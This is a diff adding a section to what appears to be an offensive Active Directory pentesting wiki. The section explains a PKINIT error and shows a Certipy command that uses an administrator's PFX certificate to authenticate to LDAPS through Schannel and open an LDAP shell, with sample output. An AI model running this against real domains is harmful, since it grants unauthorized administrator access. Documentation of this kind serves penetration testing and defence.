@@ -38,6 +38,24 @@ Alternatively, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used f
 certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
 ```
 
+{% hint style="info" %}
+If you have this error:**`KDC_ERR_PADATA_TYPE_NOSUPP`**when requesting PKINIT, it may be an indication that your targeted KDCs do not have certificates with the necessary EKU (Extended Key Usages). \
+More specificly, If a KDC must support smart card logon, its certificate must have the `Smart Card Logon` EKU\
+\
+**You can use your certificate to logon on LDAPS via Schannel**
+{% endhint %}
+
+Authentication via Schannel is supported by [certipy-ad](https://github.com/ly4k/Certipy):
+
+```bash
+certipy auth -pfx administrator.pfx -username 'administrator' -domain 'contoso.local' -ldap-shell -ldap-scheme ldaps -dc-ip $DC_IP
+[*] Connecting to 'ldaps://10.10.10.10:636'
+[*] Authenticated to '10.10.10.10' as: u:CONTOSO.LOCAL\Administrator
+Type help for list of commands
+
+# help
+```
+
 Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.
 
 ```bash
